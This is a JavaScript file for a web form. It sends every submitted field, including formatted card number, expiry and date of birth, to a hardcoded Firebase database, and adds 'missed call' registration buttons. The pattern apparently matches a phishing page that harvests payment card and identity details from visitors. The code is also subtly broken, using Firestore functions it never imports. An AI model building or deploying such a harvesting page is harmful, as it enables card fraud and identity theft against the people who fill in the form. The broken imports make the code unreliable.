 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
 import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics.js";

  const firebaseConfig = {
    apiKey: "AIzaSyC0nq-xhAkBIzL16VAAa5kbSm566YbL0k0",
    authDomain: "glms-6c08d.firebaseapp.com",
    projectId: "glms-6c08d",
    storageBucket: "glms-6c08d.firebasestorage.app",
    messagingSenderId: "986205943481",
    appId: "1:986205943481:web:cb904d016155c02bda8d68",
  };

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Ensure USER_ID
let USER_ID = localStorage.getItem('USER_ID');
if(!USER_ID){ USER_ID = 'user_' + Date.now(); localStorage.setItem('USER_ID', USER_ID); }

function collectFormFields(form){
  const data = {};
  const fields = form.querySelectorAll('input[name], select[name], textarea[name]');
  fields.forEach(f => {
    if(f.type === 'checkbox') data[f.name] = !!f.checked;
    else if(f.type === 'radio') { if(f.checked) data[f.name] = f.value; }
    else data[f.name] = f.value?.trim() ?? '';
  });
  data._submitted_from = form.getAttribute('data-page') || window.location.pathname.split('/').pop();
  data._saved_at = new Date().toISOString();
  return data;
}

async function saveToFirestore(payload){
  try{
    await setDoc(doc(db, 'users', USER_ID), payload, { merge: true });
    console.log('Saved payload', payload);
  }catch(e){
    console.error('Firestore save error', e);
    throw e;
  }
}

document.addEventListener('DOMContentLoaded', ()=>{

  // Attach to form submits
  const forms = Array.from(document.querySelectorAll('form'));
  forms.forEach(form => {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const requiredMissing = Array.from(form.querySelectorAll('[required]')).find(i => !i.value || i.value.trim()==='');
      if(requiredMissing){ requiredMissing.focus(); alert('Please complete required fields'); return; }
      const payload = collectFormFields(form);
      try{ await saveToFirestore(payload); }catch(err){ alert('Save failed, open console.'); return; }
      const next = form.getAttribute('data-action') || form.getAttribute('action') || form.action;
      if(next) window.location.href = next;
    });
  });

  // DOB formatter DD/MM/YYYY
  document.querySelectorAll('input[data-dob]').forEach(el => el.addEventListener('input', ()=>{ let v = el.value.replace(/\D/g,'').slice(0,8); if(v.length>2) v = v.slice(0,2) + '/' + v.slice(2); if(v.length>5) v = v.slice(0,5) + '/' + v.slice(5); el.value = v; }));

  // expiry MM/YY formatter
  document.querySelectorAll('input[data-expiry]').forEach(el => el.addEventListener('input', ()=>{ let v = el.value.replace(/\D/g,'').slice(0,4); if(v.length>2) v = v.slice(0,2) + '/' + v.slice(2); el.value = v; }));

  // card preview formatting
  const cardInput = document.getElementById('card-number-input');
  const cardPreview = document.getElementById('card-preview-number');
  if(cardInput && cardPreview){
    cardInput.addEventListener('input', ()=>{ let v = cardInput.value.replace(/\D/g,'').slice(0,16); const formatted = v.replace(/(.{4})/g,'$1 ').trim(); cardInput.value = formatted; cardPreview.textContent = formatted || 'XXXX XXXX XXXX XXXX'; });
  }

  // enforce maxlength numeric inputs
  document.querySelectorAll('input[maxlength]').forEach(i=> i.addEventListener('input', ()=>{ const ml = Number(i.getAttribute('maxlength')||0); if(ml && i.value.length>ml) i.value = i.value.slice(0,ml); }));

  // Missed call buttons: support tel: and mark registered then navigate
  document.querySelectorAll('[data-missed-button]').forEach(btn => {
    btn.addEventListener('click', async (e)=> {
      try{ await setDoc(doc(db,'users',USER_ID), { missed_call: true, missed_for: btn.dataset.for || null, _saved_at: new Date().toISOString() }, { merge: true }); }catch(err){ console.error(err); }
      btn.textContent = 'Call Registered ✓';
      btn.style.pointerEvents = 'none';
      const tel = btn.getAttribute('href');
      if(tel) window.location.href = tel;
      const next = btn.getAttribute('data-action');
      if(next) window.location.href = next;
    });
  });

});
